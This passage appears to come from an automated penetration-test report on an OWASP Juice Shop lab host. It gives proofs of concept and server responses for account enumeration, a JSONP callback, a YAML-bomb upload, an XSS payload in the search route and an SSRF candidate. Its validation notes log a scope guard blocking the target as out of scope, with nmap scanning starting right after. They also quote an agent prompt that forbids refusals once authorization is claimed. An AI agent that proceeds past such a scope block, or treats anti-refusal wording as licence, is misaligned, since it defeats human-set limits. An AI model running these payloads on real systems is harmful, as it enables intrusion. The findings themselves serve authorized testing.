voluptua. At vero eos et accusam et justo duo dolores et ea rebum. Stet
clita kasd gubergren, no sea takimata sanctus est Lorem ipsum dolor sit
amet. Lorem ipsum dolor sit amet, consetetur sadipscing elitr, sed diam
nonumy eirmod tempor invidunt ut labore et dolore magna aliquyam erat,
sed diam voluptua. At vero eos et accusam et justo duo dolores et ea
rebum. Stet clita kasd gubergren, no sea takimata sanctus est Lorem
ipsum dolor sit amet.

Our shareholders will be excited. It's true. No fake news.
```

### 27. Account enumeration signal: GET /rest/user/security-question
- Severity: MEDIUM
- Status: validated
- Confidence: 0.81
- Disposition: draft
- Promoted: not recorded
- Reviewed: pending
- Risk Tags: credential-exposure, authz-bypass
- Attempted: yes
- Impact Bound: max 1 request(s) per vector; 8s request timeout; capture proof material in run artifacts
- State Changed: no
- Cleanup Attempted: no
- Vector Explanation: Different password-reset/security-question responses indicate whether an account exists.

**Proof Of Concept**
GET http://192.168.1.221:3001/rest/user/security-question?email=admin%40juice-sh.op vs GET http://192.168.1.221:3001/rest/user/security-question?email=nonexistent.user.vantix%40example.invalid

**Evidence**
Valid and invalid email probes produced distinct responses.

**Remediation**
Return identical response bodies and timing for valid/invalid account lookups.

**Artifact Review**
- evidence: /home/trilobyte/.local/state/ctf-security-ops/vantix-c143ceef/runs/pentest-13314868554c/artifacts/http-validation/rest-user-security-question-account-enumeration.txt

```text
URL: http://192.168.1.221:3001/rest/user/security-question
Status: 200
Headers:

Body Snippet:
valid={"question":{"id":2,"question":"Mother's maiden name?","createdAt":"2026-04-20T15:56:19.815Z","updatedAt":"2026-04-20T15:56:19.815Z"}}

invalid={}
```

### 28. JSONP callback execution surface: GET /rest/user/whoami
- Severity: MEDIUM
- Status: validated
- Confidence: 0.80
- Disposition: draft
- Promoted: not recorded
- Reviewed: pending
- Risk Tags: none
- Attempted: yes
- Impact Bound: max 1 request(s) per vector; 8s request timeout
- State Changed: no
- Cleanup Attempted: no
- Vector Explanation: The endpoint reflects a callback name into executable JavaScript-style response content.

**Proof Of Concept**
GET http://192.168.1.221:3001/rest/user/whoami?callback=alert

**Evidence**
`GET http://192.168.1.221:3001/rest/user/whoami?callback=alert` returned callback execution markers.

**Remediation**
Remove JSONP support where possible; otherwise restrict callback names and return JSON with CORS controls.

**Artifact Review**
- evidence: /home/trilobyte/.local/state/ctf-security-ops/vantix-c143ceef/runs/pentest-13314868554c/artifacts/http-validation/rest-user-whoami-jsonp-callback.txt

```text
URL: http://192.168.1.221:3001/rest/user/whoami?callback=alert
Status: 200
Headers:
Access-Control-Allow-Origin: *
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Feature-Policy: payment 'self'
X-Recruiting: /#/jobs
Content-Type: text/javascript; charset=utf-8
Content-Length: 55
ETag: W/"37-whmqovYWQaof3cdAN4/anJctaTM"
Vary: Accept-Encoding
Date: Thu, 23 Apr 2026 02:31:33 GMT
Connection: close

Body Snippet:
/**/ typeof alert === 'function' && alert({"user":{}});
```

### 29. YAML parser resource-exhaustion signal: POST /file-upload
- Severity: MEDIUM
- Status: validated
- Confidence: 0.78
- Disposition: draft
- Promoted: not recorded
- Reviewed: pending
- Risk Tags: availability-impact, state-mutation, persistence-adjacent, rce-adjacent
- Attempted: yes
- Impact Bound: max 1 request(s) per vector; 8s request timeout; bounded availability probe only; no sustained load; single canary mutation where required; harmless marker payload only
- State Changed: yes
- Cleanup Attempted: no
- Vector Explanation: YAML anchor/alias payload triggered parser instability or server error behavior.

**Proof Of Concept**
Upload nested YAML alias payload and observe parser response stability.

**Evidence**
`POST http://192.168.1.221:3001/file-upload` with nested YAML anchors returned parser/availability error signals.

**Remediation**
Use safe YAML parser configuration, enforce depth/size limits, and reject alias-heavy payloads.

**Artifact Review**
- evidence: /home/trilobyte/.local/state/ctf-security-ops/vantix-c143ceef/runs/pentest-13314868554c/artifacts/http-validation/file-upload-yaml-bomb.txt

```text
URL: http://192.168.1.221:3001/file-upload
Status: 410
Headers:
Access-Control-Allow-Origin: *
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Feature-Policy: payment 'self'
X-Recruiting: /#/jobs
Content-Type: text/html; charset=utf-8
Vary: Accept-Encoding
Date: Thu, 23 Apr 2026 02:31:34 GMT
Connection: close
Transfer-Encoding: chunked

Body Snippet:
<html>
  <head>
    <meta charset='utf-8'> 
    <title>Error: B2B customer complaints via file upload have been deprecated for security reasons: {&quot;a&quot;:[&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;],&quot;b&quot;:[[&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;],[&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;],[&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;],[&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;],[&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;]],&quot;c&quot;:[[[&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;],[&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;],[&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;],[&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;],[&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;]],[[&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;],[&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;],[&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;],[&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;],[&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;]],[[&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;],[&quot;x&quot;... (vantix-bomb.yml)</title>
    <style>* {
  margin: 0;
  padding: 0;
  outline: 0;
}

body {
  padding: 80px 100px;
  font: 13px "Helvetica Neue", "Lucida Grande", "Arial";
  background: #ECE9E9 -webkit-gradient(linear, 0% 0%, 0% 100%, from(#fff), to(#ECE9E9));
  background: #ECE9E9 -moz-linear-gradient(top, #fff, #ECE9E9);
  background-repeat: no-repeat;
  color: #555;
  -webkit-font-smoothing: antialiased;
}
h1, h2 {
  font-size: 22px;
  color: #343434;
}
h1 em, h2 em {
  padding: 0 5px;
  font-weight: normal;
}
h1 {
  font-size: 60px;
}
h2 {
  margin-top: 10px;
}
ul li {
  list-style: none;
}
#stacktrace {
  margin-left: 60px;
}
</style>
  </head>
  <body>
    <div id="wrapper">
      <h1>OWASP Juice Shop (Express ^4.22.1)</h1>
      <h2><em>410</em> Error: B2B customer complaints via file upload have been deprecated for security reasons: {&quot;a&quot;:[&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;],&quot;b&quot;:[[&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;],[&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;],[&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;],[&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;],[&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;]],&quot;c&quot;:[[[&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;],[&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;],[&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;],[&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;],[&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;]],[[&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;],[&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;],[&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;],[&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;],[&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;]],[[&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;,&quot;x&quot;],[&quot;x&quot;... (vantix-bomb.yml)</h2>
      <ul id="stacktrace"><li> &nbsp; &nbsp;at handleYamlUpload (/juice-shop/build/routes/fileUpload.js:154:22)</li><li> &nbsp; &nbsp;at Layer.handle [as handle_request] (/juice-shop/node_modules/express/lib/router/layer.js:95:5)</li><li> &nbsp; &nbsp;at next (/juice-shop/node_modules/express/lib/router/route.js:149:13)</li><li> &nbsp; &nbsp;at handleXmlUpload (/juice-shop/build/routes/fileUpload.js:141:5)</li><li> &nbsp; &nbsp;at Layer.handle [as handle_request] (/juice-shop/node_modules/express/lib/router/layer.js:95:5)</li><li> &nbsp; &nbsp;at next (/juice-shop/node_modules/express/lib/router/route.js:149:13)</li><li> &nbsp; &nbsp;at handleZipFileUpload (/juice-shop/build/routes/fileUpload.js:88:9)</li><li> &nbsp; &nbsp;at Layer.handle [as handle_request] (/juice-shop/node_modules/express/lib/router/layer.js:95:5)</li><li> &nbsp; &nbsp;at next (/juice-shop/node_modules/express/lib/router/route.js:149:13)</li><li> &nbsp; &nbsp;at checkFileType (/juice-shop/build/routes/fileUpload.js:104:5)</li><li> &nbsp; &nbsp;at Layer.handle [as handle_request] (/juice-shop/node_modules/express/lib/router/layer.js:95:5)</li><li> &nbsp; &nbsp;at next (/juice-shop/node_modules/express/lib/router/route.js:149:13)</li><li> &nbsp; &nbsp;at checkUploadSize (/juice-shop/build/routes/fileUpload.js:96:5)</li><li> &nbsp; &nbsp;at Layer.handle [as handle_request] (/juice-shop/node_modules/express/lib/router/layer.js:95:5)</li><li> &nbsp; &nbsp;at next (/juice-shop/node_modules/express/lib/router/route.js:149:13)</li><li> &nbsp; &nbsp;at /juice-shop/build/routes/metrics.js:84:9</li><li> &nbsp; &nbsp;at Layer.handle [as handle_request] (/juice-shop/node_modules/express/lib/router/layer.js:95:5)</li><li> &nbsp; &nbsp;at next (/juice-shop/node_modules/express/lib/router/route.js:149:13)</li><li> &nbsp; &nbsp;at ensureFileIsPassed (/juice-shop/build/routes/fileUpload.js:46:9)</li><li> &nbsp; &nbsp;at Layer.handle [as handle_request] (/juice-shop/node_modules/express/lib/router/layer.js:95:5)</li><li> &nbsp; &nbsp;at next (/juice-shop/node_modules/express/lib/router/route.js:149:13)</li><li> &nbsp; &nbsp;at done (/juice-shop/node_modules/multer/lib/make-middleware.js:47:7)</li></ul>
    </div>
  </body>
</html>
```

### 30. Client-side reflected XSS sink signal: #/search
- Severity: MEDIUM
- Status: validated
- Confidence: 0.76
- Disposition: draft
- Promoted: not recorded
- Reviewed: pending
- Risk Tags: authz-bypass
- Attempted: yes
- Impact Bound: max 1 request(s) per vector; 8s request timeout
- State Changed: no
- Cleanup Attempted: no
- Vector Explanation: Client bundle contains search-route HTML trust bypass logic that can render query-controlled content.

**Proof Of Concept**
Navigate to `http://192.168.1.221:3001/#/search?q=<img src=x onerror=alert(1)>` and observe whether query content executes in browser context.

**Evidence**
`GET http://192.168.1.221:3001/main.js` contained search and `bypassSecurityTrustHtml` markers.

**Remediation**
Remove trust-bypass rendering for user-controlled search values and enforce contextual output encoding.

**Artifact Review**
- evidence: /home/trilobyte/.local/state/ctf-security-ops/vantix-c143ceef/runs/pentest-13314868554c/artifacts/http-validation/client-bundle-search-xss-sink.txt

```text
URL: http://192.168.1.221:3001/main.js
Status: 200
Headers:
Access-Control-Allow-Origin: *
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Feature-Policy: payment 'self'
X-Recruiting: /#/jobs
Accept-Ranges: bytes
Cache-Control: public, max-age=0
Last-Modified: Tue, 14 Apr 2026 06:50:11 GMT
ETag: W/"14cdab-19d8ac134b8"
Content-Type: application/javascript; charset=UTF-8
Content-Length: 1363371
Vary: Accept-Encoding
Date: Thu, 23 Apr 2026 02:31:32 GMT
Connection: close

Body Snippet:
import{a as Am}from"./chunk-24EZLZ4I.js";import{a as Bm,b as Um,c as N0,d as A6,f as jm,g as OS}from"./chunk-T3PSKZ45.js";import{$ as bm,$a as L1,$b as Qt,A as zS,Aa as M6,Ab as wr,B as b1,Ba as Bi,Bb as J,C as mm,Ca as AS,Cb as z6,D as hm,Da as Pn,Db as mt,E as Ii,Ea as W1,Eb as u2,F as pm,Fa as Sm,Fb as Vn,G as X1,Ga as ga,Gb as _a,H as x0,Ha as km,Hb as ke,I as TS,Ia as DS,Ib as ea,J as C1,Ja as T0,Jb as g2,K as _r,Ka as Pt,Kb as Qa,L as A2,La as fi,Lb as e1,M as M0,Ma as zm,Mb as ba,N as fm,Na as Zo,Nb as Sr,O as um,Oa as Tm,Ob as Vm,P as Qo,Pa as w6,Pb as D0,Q as w0,Qa as S6,Qb as I0,R as gm,Ra as xi,Rb as kr,S as vm,Sa as ze,Sb as L0,T as Ga,Ta as y1,Tb as Mi,U as ES,Ua as Ce,Ub as zr,V as s1,Va as ge,Vb as at,W as Y2,Wa as ve,Wb as zt,X as b6,Xa as va,Xb as We,Y as n1,Ya as E0,Yb as Om,Z as _m,Za as k6,Zb as IS,_ as S0,_a as xr,_b as ht,a as ue,aa as k0,ab as K2,ac as f1,b as Nt,ba as Z2,bb as E1,bc as P0,c as Zd,ca as C6,cb as I2,cc as v2,d as It,da as Yo,db as l1,dc as T6,e as Se,ea as Cm,eb as Em,ec as V0,f as K,fa as An,fb as ui,fc as Ze,g as Y,ga as br,gb as Wa,gc as E6,h as W,ha as y6,hb as le,hc as Qe,i as $1,ia as Dn,ib as oe,ic as LS,j as y0,ja as h2,jb as ne,jc as Je,k as yt,ka as $2,kb as pe,kc as Hm,l as m2,la as Xi,lb as X2,lc as PS,m as om,ma as z0,mb as p2,mc as O0,n as p1,na as D2,nb as Dm,nc as Nm,o as Lt,oa as qt,ob as Im,oc as Rm,p as K1,pa as ym,pb as A0,pc as VS,q as ja,qa as Cr,qb as de,qc as nt,r as pa,ra as Li,rb as he,rc as $e,s as cm,sa as In,sb as J2,sc as et,t as sm,ta as xm,tb as Lm,tc as H0,u as Ki,ua as Mm,ub as Mr,uc as Fm,v as fa,va as Ln,vb as Vt,w as En,wa as wm,wb as J1,x as lm,xa as yr,xb as f2,y as dm,ya as ua,yb as Pm,z as qa,za as x6,zb as gt}from"./chunk-4MIYPPGW.js";import{$ as Ut,$b as m,$c as vr,A as Kt,Aa as He,Ab as c,B as $t,Ba as kt,Bb as s,Cb as u,D as j,Da as ae,Db as Gt,Dc as Qd,Ea as E2,Eb as Jt,Ec as Ee,F as Tn,Fb as Zi,Fc as ur,Gb as _e,Gc as Yd,H as j1,Ha as v6,Hb as be,Hc as Z,I as g6,Ib as _1,Ic as ot,J as Ad,Jb as L,K as Dd,Kb as Ai,L as Id,La as tt,Lb as S,M as Ld,Ma as wt,Mb as qd,Mc as k,Na as _6,Nb as v,Ob as Re,Pa as Nd,Pb as me,Qa as l,Qb as Be,Qc as $d,Ra as Rd,Rb as te,Sa as N,Sb as F,Sc as gr,Ta as re,Tb as B,U as Pd,Ua as m1,Uc as T1,V as i1,Va as h1,Vc as Ba,W as q1,Wa as Fd,Wc as $i,X as xt,Xa as v1,Xb as se,Xc as _0,Y as Vd,Ya as it,Yb as _t,Yc as b0,Z as hr,Za as u0,Zb as ie,Zc as Kd,_ as Xt,_a as G1,_b as Dt,_c as C0,a as o1,ac as A,ad as Ua,ba as hi,bc as E,bd as Xd,c as ma,ca as $,cb as D,cc as O1,cd as Jd,da as ye,db as xe,dc as Fa,dd as Di,eb as X,ec as Ni,f as we,fa as ce,fb as g0,fc as Ri,g as d2,ga as Ei,gb as Fe,gc as Fi,gd as a1,h as Sd,ha as h,hb as Bd,hc as Ve,hd as em,i as f6,ia as Od,ib as R,ic as W2,id as kS,j as Hi,jb as pr,jc as Gd,jd as tm,k as kd,kc as Ie,kd as im,l as c1,la as z,lc as St,ld as Ae,ma as T,mc as bt,md as am,n as zd,na as Mt,nc as z1,nd as nm,oa as yi,oc as v0,od as rm,p as kn,pa as st,pb as Ra,pc as b,pd as Wt,q,qa as jt,qb as G,qc as C,r as Ha,rb as Ud,rc as dt,rd as Z1,s as u6,sb as M,sc as Q2,sd as ha,tb as jd,ua as Hd,ub as w,uc as Wd,v as mr,va as ft,vb as fr,w as zn,wb as Ft,x as Na,xa as lt,xb as qe,y as Td,ya as p0,yb as Ge,yc as pi,z as Ed,za as f0,zb as f}from"./chunk-LHKS7QUN.js";import{a as Xe,b as U1,d as wd,e as x,f as Te,h as dr,j as Pe}from"./chunk-TWZW5B45.js";function Xo(t){return typeof Symbol=="function"&&typeof Symbol.iterator=="symbol"?Xo=function(n){return typeof n}:Xo=function(n){return n&&typeof Symbol=="function"&&n.constructor===Symbol&&n!==Symbol.prototype?"symbol":typeof n},Xo(t)}function HS(t,n){if(!(t instanceof n))throw new TypeError("Cannot call a class as a function")}function qm(t,n){for(var e=0;e<n.length;e++){var i=n[e];i.enumerable=i.enumerable||!1,i.configurable=!0,"value"in i&&(i.writable=!0),Object.defineProperty(t,i.key,i)}}function NS(t,n,e){return n&&qm(t.prototype,n),e&&qm(t,e),t}function RS(t,n,e){return n in t?Object.defineProperty(t,n,{value:e,enumerable:!0,configurable:!0,writable:!0}):t[n]=e,t}function Ot(t){for(var n=1;n<arguments.length;n++){var e=arguments[n]!=null?arguments[n]:{},i=Object.keys(e);typeof Object.getOwnPropertySymbols=="function"&&(i=i.concat(Object.getOwnPropertySymbols(e).filter(function(a){return Object.getOwnPropertyDescriptor(e,a).enumerable}))),i.forEach(function(a){RS(t,a,e[a])})}return t}function j6(t,n){return BS(t)||jS(t,n)||GS()}function q6(t){return FS(t)||US(t)||qS()}function FS(t){if(Array.isArray(t)){for(var n=0,e=new Array(t.length);n<t.length;n++)e[n]=t[n];return e}}function BS(t){if(Array.isArray(t))return t}function US(t){if(Symbol.iterator in Object(t)||Object.prototype.toString.call(t)==="[object Arguments]")return Array.from(t)}function jS(t,n){var e=[],i=!0,a=!1,r=void 0;try{for(var o=t[Symbol.iterator](),d;!(i=(d=o.next()).done)&&(e.push(d.value),!(n&&e.length===n));i=!0);}catch(p){a=!0,r=p}finally{try{!i&&o.return!=null&&o.return()}finally{if(a)throw r}}return e}function qS(){throw new TypeError("Invalid attempt to spread non-iterable instance")}function GS(){throw new TypeError("Invalid attempt to destructure non-iterable instance")}function rk(t){var n=H1.querySelector("script["+t+"]");if(n)return n.getAttribute(t)}function ok(t){return t===""?!0:t==="false"?!1:t==="true"?!0:t}function lk(t){Ma&&(B0?setTimeout(t,0):v9.push(t))}function hk(){for(var t=0;t<$o.length;t++)$o[t][0]($o[t][1]);$o=[],H6=!1}function q0(t,n){$o.push([t,n]),H6||(H6=!0,mk(hk,0))}function pk(t,n){function e(a){Q6(n,a)}function i(a){Jo(n,a)}try{t(e,i)}catch(a){i(a)}}function C9(t){var n=t.owner,e=n._state,i=n._data,a=t[e],r=t.then;if(typeof a=="function"){e=U0;try{i=a(i)}catch(o){Jo(r,o)}}y9(r,i)||(e===U0&&Q6(r,i),e===j0&&Jo(r,i))}function y9(t,n){var e;try{if(t===n)throw new TypeError("A promises callback cannot return that same promise.");if(n&&(typeof n=="function"||Xo(n)==="object")){var i=n.then;if(typeof i=="function")return i.call(n,function(a){e||(e=!0,n===a?x9(t,a):Q6(t,a))},function(a){e||(e=!0,Jo(t,a))
```

### 31. Security header hardening gap
- Severity: MEDIUM
- Status: validated
- Confidence: 0.76
- Disposition: draft
- Promoted: not recorded
- Reviewed: pending
- Risk Tags: none
- Attempted: yes
- Impact Bound: max 1 request(s) per vector; 8s request timeout
- State Changed: no
- Cleanup Attempted: no
- Vector Explanation: Response headers are missing multiple baseline browser hardening controls.

**Proof Of Concept**
GET http://192.168.1.221:3001/ and inspect response headers.

**Evidence**
Missing headers: strict-transport-security, content-security-policy on http://192.168.1.221:3001/.

**Remediation**
Set HSTS (TLS deployments), CSP, and X-Content-Type-Options headers with policy-aligned values.

### 32. SSRF validation candidate: /profile/image/url
- Severity: MEDIUM
- Status: validated
- Confidence: 0.62
- Disposition: draft
- Promoted: not recorded
- Reviewed: pending
- Risk Tags: persistence-adjacent
- Attempted: yes
- Impact Bound: max 1 request(s) per vector; 8s request timeout; harmless marker payload only
- State Changed: yes
- Cleanup Attempted: no
- Vector Explanation: Browser/API discovery found a URL-ingestion style endpoint requiring SSRF validation.

**Proof Of Concept**
Review accepted URL parameters on http://192.168.1.221:3001/profile/image/url and validate with non-destructive internal canary URLs.

**Evidence**
Discovered URL-ingestion style endpoint `/profile/image/url` during browser/network assessment.

**Remediation**
Enforce URL allowlists, block private/link-local ranges, and fetch remote content through hardened proxy controls.

## Browser Evidence Images

<details>
<summary>Screenshot: <code>001_http-192-168-1-221-3001.png</code></summary>

<img src="assets/juice-shop-screenshot-dc791381cb860f01.jpg" alt="001_http-192-168-1-221-3001.png" width="90%"/>
</details>

<details>
<summary>Screenshot: <code>002_http-192-168-1-221-3001.png</code></summary>

<img src="assets/juice-shop-screenshot-7c50b831ec56b686.jpg" alt="002_http-192-168-1-221-3001.png" width="90%"/>
</details>

<details>
<summary>Screenshot: <code>003_http-192-168-1-221-3001-login.png</code></summary>

<img src="assets/juice-shop-screenshot-066e30af9f1854fa.jpg" alt="003_http-192-168-1-221-3001-login.png" width="90%"/>
</details>

<details>
<summary>Screenshot: <code>004_http-192-168-1-221-3001-register.png</code></summary>

<img src="assets/juice-shop-screenshot-b4ec11ddda16d87b.jpg" alt="004_http-192-168-1-221-3001-register.png" width="90%"/>
</details>

<details>
<summary>Screenshot: <code>005_http-192-168-1-221-3001-forgot-password.png</code></summary>

<img src="assets/juice-shop-screenshot-e932e82ca45a57c6.jpg" alt="005_http-192-168-1-221-3001-forgot-password.png" width="90%"/>
</details>

<details>
<summary>Screenshot: <code>006_http-192-168-1-221-3001-search.png</code></summary>

<img src="assets/juice-shop-screenshot-0f2d6a17640eac08.jpg" alt="006_http-192-168-1-221-3001-search.png" width="90%"/>
</details>

<details>
<summary>Screenshot: <code>007_http-192-168-1-221-3001-contact.png</code></summary>

<img src="assets/juice-shop-screenshot-0625aad708004b9f.jpg" alt="007_http-192-168-1-221-3001-contact.png" width="90%"/>
</details>

<details>
<summary>Screenshot: <code>008_http-192-168-1-221-3001-about.png</code></summary>

<img src="assets/juice-shop-screenshot-ea9e5ec3185dfed6.jpg" alt="008_http-192-168-1-221-3001-about.png" width="90%"/>
</details>

<details>
<summary>Screenshot: <code>009_http-192-168-1-221-3001-photo-wall.png</code></summary>

<img src="assets/juice-shop-screenshot-d71112f8fcfe1175.jpg" alt="009_http-192-168-1-221-3001-photo-wall.png" width="90%"/>
</details>

<details>
<summary>Screenshot: <code>010_http-192-168-1-221-3001-ftp.png</code></summary>

<img src="assets/juice-shop-screenshot-457724610c128aad.jpg" alt="010_http-192-168-1-221-3001-ftp.png" width="90%"/>
</details>

<details>
<summary>Screenshot: <code>011_http-192-168-1-221-3001-api-docs.png</code></summary>

<img src="assets/juice-shop-screenshot-1a217edfe5a35547.jpg" alt="011_http-192-168-1-221-3001-api-docs.png" width="90%"/>
</details>

<details>
<summary>Screenshot: <code>012_http-192-168-1-221-3001-score-board.png</code></summary>

<img src="assets/juice-shop-screenshot-a2ecd4c5f1682691.jpg" alt="012_http-192-168-1-221-3001-score-board.png" width="90%"/>
</details>

<details>
<summary>Screenshot: <code>013_http-192-168-1-221-3001-ftp-legal-md.png</code></summary>

<img src="assets/juice-shop-screenshot-9b2370d2af1b3cae.jpg" alt="013_http-192-168-1-221-3001-ftp-legal-md.png" width="90%"/>
</details>

<details>
<summary>Screenshot: <code>014_http-192-168-1-221-3001-ftp-quarantine.png</code></summary>

<img src="assets/juice-shop-screenshot-3c909beb7986eb12.jpg" alt="014_http-192-168-1-221-3001-ftp-quarantine.png" width="90%"/>
</details>

<details>
<summary>Screenshot: <code>015_http-192-168-1-221-3001-ftp-acquisitions-md.png</code></summary>

<img src="assets/juice-shop-screenshot-ec41c9862da4dff3.jpg" alt="015_http-192-168-1-221-3001-ftp-acquisitions-md.png" width="90%"/>
</details>

<details>
<summary>Screenshot: <code>016_http-192-168-1-221-3001-ftp-announcement-encrypted-md.png</code></summary>

<img src="assets/juice-shop-screenshot-576c9679366fc534.jpg" alt="016_http-192-168-1-221-3001-ftp-announcement-encrypted-md.png" width="90%"/>
</details>

<details>
<summary>Screenshot: <code>017_http-192-168-1-221-3001-ftp-coupons-2013-md-bak.png</code></summary>

<img src="assets/juice-shop-screenshot-d87f95131044eb29.jpg" alt="017_http-192-168-1-221-3001-ftp-coupons-2013-md-bak.png" width="90%"/>
</details>

<details>
<summary>Screenshot: <code>018_http-192-168-1-221-3001-ftp-eastere-gg.png</code></summary>

<img src="assets/juice-shop-screenshot-d87f95131044eb29.jpg" alt="018_http-192-168-1-221-3001-ftp-eastere-gg.png" width="90%"/>
</details>

<details>
<summary>Screenshot: <code>019_http-192-168-1-221-3001-ftp-encrypt-pyc.png</code></summary>

<img src="assets/juice-shop-screenshot-d87f95131044eb29.jpg" alt="019_http-192-168-1-221-3001-ftp-encrypt-pyc.png" width="90%"/>
</details>

<details>
<summary>Screenshot: <code>020_http-192-168-1-221-3001-ftp-package-lock-json-bak.png</code></summary>

<img src="assets/juice-shop-screenshot-d87f95131044eb29.jpg" alt="020_http-192-168-1-221-3001-ftp-package-lock-json-bak.png" width="90%"/>
</details>

<details>
<summary>Screenshot: <code>021_http-192-168-1-221-3001-ftp-package-json-bak.png</code></summary>

<img src="assets/juice-shop-screenshot-d87f95131044eb29.jpg" alt="021_http-192-168-1-221-3001-ftp-package-json-bak.png" width="90%"/>
</details>

<details>
<summary>Screenshot: <code>022_http-192-168-1-221-3001-ftp-suspicious-errors-yml.png</code></summary>

<img src="assets/juice-shop-screenshot-d87f95131044eb29.jpg" alt="022_http-192-168-1-221-3001-ftp-suspicious-errors-yml.png" width="90%"/>
</details>

<details>
<summary>Screenshot: <code>023_http-192-168-1-221-3001-api-docs-Order.png</code></summary>

<img src="assets/juice-shop-screenshot-1a217edfe5a35547.jpg" alt="023_http-192-168-1-221-3001-api-docs-Order.png" width="90%"/>
</details>

<details>
<summary>Screenshot: <code>024_http-192-168-1-221-3001-api-docs-Order-createCustomerOrder.png</code></summary>

<img src="assets/juice-shop-screenshot-1a217edfe5a35547.jpg" alt="024_http-192-168-1-221-3001-api-docs-Order-createCustomerOrder.png" width="90%"/>
</details>

## Validation Notes
- [recon] blocked: target 192.168.1.221 out of engagement scope — 192.168.1.221 is in a denied range (private/link-local/metadata)
- [recon] starting: nmap -Pn -sT --top-ports 100 --open 192.168.1.221
- Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-22 22:29 EDT
- Nmap scan report for skilledagents.localdomain (192.168.1.221)
- Host is up (0.00055s latency).
- Not shown: 97 closed tcp ports (conn-refused)
- PORT     STATE SERVICE
- 22/tcp   open  ssh
- 111/tcp  open  rpcbind
- 9100/tcp open  jetdirect
- Nmap done: 1 IP address (1 host up) scanned in 0.21 seconds
- [recon] escalating: nmap -Pn -sT --top-ports 1000 --open 192.168.1.221
- Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-22 22:29 EDT
- Nmap scan report for skilledagents.localdomain (192.168.1.221)
- Host is up (0.00056s latency).
- Not shown: 996 closed tcp ports (conn-refused)
- PORT     STATE SERVICE
- 22/tcp   open  ssh
- 111/tcp  open  rpcbind
- 3001/tcp open  nessus
- 9100/tcp open  jetdirect
- Nmap done: 1 IP address (1 host up) scanned in 0.21 seconds
- [browser] starting assessment: http://192.168.1.221:3001
- Reading additional input from stdin...
- user
- Execution Contract:
- - This is an authorized lab assessment target; proceed with target-specific assessment actions.
- - Follow the existing Vantix policy gates and approvals already enforced by the orchestrator.
- - Produce concrete validation findings with evidence artifacts and reproducible checks.
- - High Risk Surfaces are enabled for this run.
- - Treat target labels such as potentially harmful, DoS, state mutation, local file read, or persistence-adjacent as high risk surfaces metadata.
- - When high risk surfaces are enabled, execute one bounded proof when in scope and record risk_tags, impact_bound, state_changed, cleanup_attempted, and artifact paths.
- - When high risk surfaces are disabled, skip those proofs and emit structured validation_attempt records with why_not_attempted.
- - Do not return generic refusal templates when authorization and scope are provided in this prompt.
- This system operates exclusively within authorized lab environments for security training and red-team validation. All actions are explicitly in-scope per target authorization.
- Mode: Authorized Assessment
- Target: 192.168.1.221
- Startup context:
- # Dense Codex Context
- ### Learning Digest

## Recommendations
- Prioritize critical and high findings first, then re-run focused validation.
- Add automated regression checks for every validated PoC path.
- Keep this report as the baseline and compare deltas on retest.
